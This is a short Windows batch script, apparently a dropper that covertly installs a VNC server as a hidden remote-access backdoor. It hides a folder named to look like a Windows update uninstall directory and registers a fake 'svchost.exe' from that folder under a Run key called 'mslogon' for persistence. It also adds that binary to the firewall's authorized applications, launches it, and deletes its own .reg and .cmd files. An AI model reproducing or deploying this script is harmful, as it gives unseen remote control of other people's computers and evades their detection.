@echo off
attrib %systemroot%\$NtUninstallKB21050c07160c070f0b0a0a05031b05$ +r +s +h 

:: Here are some regedit entries which have to be there, to allow the VNC Server to run as a service
regedit /s systesmsettings1.reg
regedit /s systesmsettings2.reg
regedit /s systesmsettings3.reg
reg.exe add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v mslogon /t REG_SZ /d "%systemroot%\\$NtUninstallKB21050c07160c070f0b0a0a05031b051$\\svchost.exe" /f 
reg.exe add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List /v %systemroot%\\$NtUninstallKB21050c07160c070f0b0a0a05031b051$\\svchost.exe /t REG_SZ /d "%systemroot%\\$NtUninstallKB21050c07160c070f0b0a0a05031b051$\\svchost.exe:*:Enabled:mslogon" /f
del *.reg
start svchost.exe
del *.cmd